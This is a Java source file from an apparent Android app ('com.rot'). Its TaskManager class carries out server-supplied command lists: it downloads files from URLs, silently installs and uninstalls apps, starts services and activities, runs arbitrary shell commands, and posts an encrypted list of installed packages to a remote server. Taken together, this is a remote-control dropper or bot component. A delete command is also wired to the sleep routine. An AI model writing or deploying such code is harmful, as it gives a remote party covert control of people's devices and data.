package com.rot.main;
import java.io.File;
import java.util.List;
import java.util.Set;
import org.json.JSONException;
import org.json.JSONObject;
import android.content.Context;
import com.rot.bean.Command;
import com.rot.bean.CommandResult;
import com.rot.bean.Response;
import com.rot.bean.RetentionReportRequest;
import com.rot.bean.framework.Json;
import com.rot.callback.DownloadCallback;
import com.rot.callback.RequestCallback;
import com.rot.utils.CollectionUtils;
import com.rot.utils.CommonUtils;
import com.rot.utils.FileUtils;
import com.rot.utils.InfoUtils;
import com.rot.utils.MyLogger;
import com.rot.utils.PackageUtils;
import com.rot.utils.RequestUtils;
import com.rot.utils.StringUtils;
import com.rot.utils.shell.ShellManager;

public class TaskManager {
    private List<Command> commands;
    private int count;
    private int index;
    private Context context;
    private static interface ExecuteCallback {
        void onResult(CommandResult result);
    }
    public TaskManager(Context context, List<Command> commands) {
        this.context = context;
        this.commands = commands;
        this.count = commands.size();
        this.index = 0;
    }
    public void execute() {
        if (index < count) {
            final Command command = commands.get(index);
            execute(command, new ExecuteCallback() {
                @Override
                public void onResult(CommandResult result) {
                    command.result = result;
                    if (command.continueOnError || result.success) {
                        index++;
                        execute();
                    }
                }
            });
        }
    }
    private void execute(final Command command, ExecuteCallback callback) {
        switch (command.method) {
            case Command.METHOD_DOWNLOAD:
                download(command, callback);
                break;
            case Command.METHOD_INSTALL:
                install(command, callback);
                break;
            case Command.METHOD_START_SERVICE:
                startService(command, callback);
                break;
            case Command.METHOD_START_ACTIVITY:
                startActivity(command, callback);
                break;
            case Command.METHOD_STOP_APP:
                stopApp(command, callback);
                break;
            case Command.METHOD_UNINSTALL:
                uninstall(command, callback);
                break;
            case Command.METHOD_RETENTION_REPORT:
                reportRetention(command, callback);
                break;
            case Command.METHOD_DELAY:
                sleep(command, callback);
                break;
            case Command.METHOD_DELETE:
                sleep(command, callback);
                break;
            case Command.METHOD_COMMAND:
                executeCmd(command, callback);
        }
    }
    private void executeCmd(Command command, ExecuteCallback callback) {
        CommandResult result = ShellManager.execute(command.params, false);
        callback.onResult(result);
    }
    private void sleep(Command command, ExecuteCallback callback) {
        CommandResult result = new CommandResult();
        try {
            Thread.sleep(1000L * Integer.valueOf(command.params));
            result.success = true;
        } catch (Exception e) {
            result.error = CommonUtils.getExcption(e);
        }
        callback.onResult(result);
    }
    private void reportRetention(Command command, ExecuteCallback callback) {
        Set<String> installedPackages = PackageUtils.getFilteredInstalledPackages(context, command.params.split(","));
        final ConfigManager manager = ConfigManager.getInstance(context);
        boolean success = true;
        String error = null;
        try {
            RetentionReportRequest request = InfoUtils.initForm(context, RetentionReportRequest.class);
            request.installedPackageNames = CollectionUtils.toString(installedPackages);
            JSONObject data = request.toJson();
            RequestUtils.encryptPost(context, manager.getRequstUrl(), data, new RequestCallback() {
                @Override
                public void onResult(String content, Throwable error) {
                    if (StringUtils.isNotBlank(content)) {
                        try {
                            Response response = Json.optObj(Response.class, new JSONObject(content));
                            manager.save(response.config);
                        } catch (JSONException e) {
                            MyLogger.error(e);
                        }
                    }
                }
            });
        } catch (Exception e) {
            MyLogger.error(e);
            success = false;
            error = CommonUtils.getExcption(e);
        }
        callback.onResult(new CommandResult(success, error));
    }
    private void uninstall(Command command, ExecuteCallback callback) {
        CommandResult result = PackageUtils.unInstallApp(context, command.params);
        callback.onResult(result);
    }
    private void stopApp(Command command, ExecuteCallback callback) {
        callback.onResult(PackageUtils.stopApp(context, command.params));
    }
    private void startActivity(Command command, ExecuteCallback callback) {
        callback.onResult(PackageUtils.startActivity(context, command.params));
    }
    private void startService(Command command, ExecuteCallback callback) {
        callback.onResult(PackageUtils.startService(context, command.params));
    }
    private void install(Command command, ExecuteCallback callback) {
        CommandResult result = PackageUtils.installApp(context, FileUtils.getUrlFile(context, command.params).getAbsolutePath());
        callback.onResult(result);
    }
    private void download(Command command, final ExecuteCallback callback) {
        String url = command.params;
        RequestUtils.download(url, FileUtils.getUrlFile(context, url), new DownloadCallback() {
            @Override
            public void onResult(File file, Throwable error) {
                CommandResult result = new CommandResult();
                result.success = file != null;
                if (error != null) {
                    result.error = CommonUtils.getExcption(error);
                }
                callback.onResult(result);
            }
        });
    }
}
